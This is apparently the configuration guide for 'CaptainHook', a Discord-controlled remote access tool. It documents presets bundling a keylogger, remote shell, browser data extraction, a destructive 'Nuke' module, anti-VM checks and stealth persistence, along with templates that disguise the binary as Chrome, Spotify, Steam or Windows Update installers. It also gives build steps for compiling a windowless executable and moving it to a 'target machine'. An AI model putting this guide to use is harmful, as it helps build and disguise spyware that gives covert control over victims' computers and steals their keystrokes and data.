# 🛠️ Architect Builder Configuration

This document explains the features and options available in the Architect Builder CLI.

---

## 1. Presets Guide

Presets are pre-defined configurations optimized for specific use-cases.

### **🛡️ Full-Throttle (All-in-One)**
- **Included Modules:** Everything (Keylogger, Media, Shell, Nuke, Fun, etc.).
- **Anti-VM:** Enabled.
- **Stealth (Wraith):** Enabled.
- **Use-Case:** Maximum control over a target machine.

### **👻 Ghost (Extreme Stealth)**
- **Included Modules:** Shell, Screenshot, File Manager, Info, Keylogger.
- **Excluded Modules:** All "Fun", "Nuke", and "Media" (Webcam/Audio) to reduce binary size and detection profile.
- **Anti-VM:** Enabled.
- **Stealth (Wraith):** Enabled.
- **Use-Case:** Long-term, high-stealth monitoring and administration.

### **🧪 The Tester (VM Friendly)**
- **Included Modules:** Everything.
- **Anti-VM:** **DISABLED**.
- **Stealth (Wraith):** **DISABLED**.
- **Use-Case:** Safe local development or testing in virtual machines where the bot should NOT hide or persist.

### **🤡 Troll-Mode (High Visibility)**
- **Included Modules:** Media, Control, Fun, Screenshot.
- **Excluded Modules:** Browser extraction and Nuke (to avoid "real" damage).
- **Anti-VM:** Disabled.
- **Stealth (Wraith):** Disabled.
- **Use-Case:** Designed for pranks and visible remote interaction.

---

## 2. Disguise Templates

Disguises allow you to spoof the executable's appearance and metadata.

| Template | Icon | Description |
| :--- | :--- | :--- |
| **Google Chrome** | Chrome Logo | Spoofs "Google Chrome Installer" (Version 120.0). |
| **Spotify** | Spotify Logo | Spoofs "Spotify Music Player". |
| **Steam** | Steam Logo | Spoofs "Steam Client Bootstrapper". |
| **Windows Update** | Win Logo | Spoofs "Windows Service Host". |

---

## 3. The Build Process

When you run the `captainhook` command (after professional installation), the builder performs several steps:

1.  **Staging:** Copies the source code to a temporary `build_staging/` directory.
2.  **Injection:** Injects your Discord Token and Guild ID into `src/client/core/config.py`.
3.  **Optimization:** Edits `src/client/main.py` to only load the modules specified in your chosen Preset.
4.  **Toggling:** Disables/Enables Wraith Engine and Anti-VM checks based on the Preset.
5.  **Preparation:** Prepares the build for compilation into a single, standalone binary (using PyInstaller or Nuitka).

---

## 4. Final Compilation (Native)

After running the builder, compile the staged source into a single file:

**Linux / macOS:**
```bash
pyinstaller --onefile --noconsole --name CaptainHook build_staging/src/client/main.py
# Output: dist/CaptainHook (no extension on Linux)
```

**Windows:**
```bash
pyinstaller --onefile --noconsole --name CaptainHook build_staging/src/client/main.py
# Output: dist\CaptainHook.exe
```

> **Note:** Always run PyInstaller from the `CaptainHook/` project root. The output goes to `dist/`.

---

## 🚀 Advanced: Docker Workflow

For professional cross-platform development, use **Docker** to compile for other operating systems without leaving your current environment.

### 1. Prerequisites

Install Docker and Docker Compose on your host machine. On Linux:
```bash
sudo apt update && sudo apt install docker.io docker-compose
sudo usermod -aG docker $USER
# Log out and back in for group membership to take effect
```

### 2. Run the Builder

Set up a virtual environment (optional but recommended to keep your system clean) and run the builder:
```bash
cd ~/Dokumente/Github/CaptainHook
python3 -m venv .venv
source .venv/bin/activate  # Windows: .venv\Scripts\activate
python3 src/builder/main.py
# Follow the prompts: enter Discord Token, Guild ID, select Preset, select Disguise
```

> **Note:** The builder itself doesn't require the package to be installed (`pip install .`). It runs the script directly to generate `build_staging/`. Using venv here is optional but recommended to avoid polluting your system Python.

This creates the `build_staging/` directory with your injected credentials.

### 3. Build for Windows (on Linux)

```bash
cd ~/Dokumente/Github/CaptainHook
docker-compose up windows-builder
```

The Windows builder uses a Wine-based image (`cdrx/pyinstaller-windows`). This may take 5-15 minutes on first run (it downloads the image and builds in a Python 3.7 Wine environment).

**Output:** `dist/CaptainHook.exe`

### 4. Build for Linux (on Windows/Mac)

```bash
docker-compose up linux-builder
```

**Output:** `dist/CaptainHook` (no extension on Linux)

### 5. Transfer to Target Machine

Copy the output file to your target VM/PC:

**Linux VM:** Copy `dist/CaptainHook` via shared folder, USB, or `scp`:
```bash
chmod +x CaptainHook
./CaptainHook
```

**Windows VM:** Copy `dist/CaptainHook.exe` via shared folder or USB. Run as Administrator to test all features.

### Troubleshooting Docker Builds

**Error: `win32security not found`** — Fixed in v3.1. Ensure `pyproject.toml` includes `pywin32` with platform marker. Rebuild the builder stage first.

**Error: `Script file does not exist`** — You ran PyInstaller from inside `dist/`. Always run from the `CaptainHook/` project root.

**Error: `externally-managed-environment`** — You ran system `pip` on a PEP-668 managed Python. Use the virtual environment: `source .venv/bin/activate && pip install .`

**Container exits immediately:** Check that Docker has internet access (the builder image downloads packages). Run `docker-compose up --build windows-builder` to force a fresh build.

---

## 🧹 Cleanup (After Build)

Once you have your compiled binary in `dist/`, you can safely remove everything else:

```bash
# Remove build artifacts and source (keeps only the final binary)
rm -rf build build_staging dist/CaptainHook.spec
rm -rf .venv           # virtual environment
rm -rf __pycache__ .pytest_cache src/**/__pycache__

# Optional: remove docs and other non-essential files
rm -rf docs tests .github
```

**Result:** Only `dist/CaptainHook` (or `.exe`) remains — a single portable binary.

> Docker files can remain if you plan to rebuild later. Remove them with `rm -rf docker-compose.yml Dockerfile .dockerignore` if you want a truly clean slate.

## 🍎 macOS Restrictions

- **Standard Method:** You must run the builder and PyInstaller on actual macOS hardware.
- **Alternative:** For advanced users, tools like [osxcross](https://github.com/tpoechtrager/osxcross) exist but are complex to set up.
- **Recommended:** Use [GitHub Actions](https://docs.github.com/en/actions/automating-builds-and-tests/building-and-testing-python#building-on-multiple-operating-systems) to automatically build for macOS in the cloud whenever you push code.
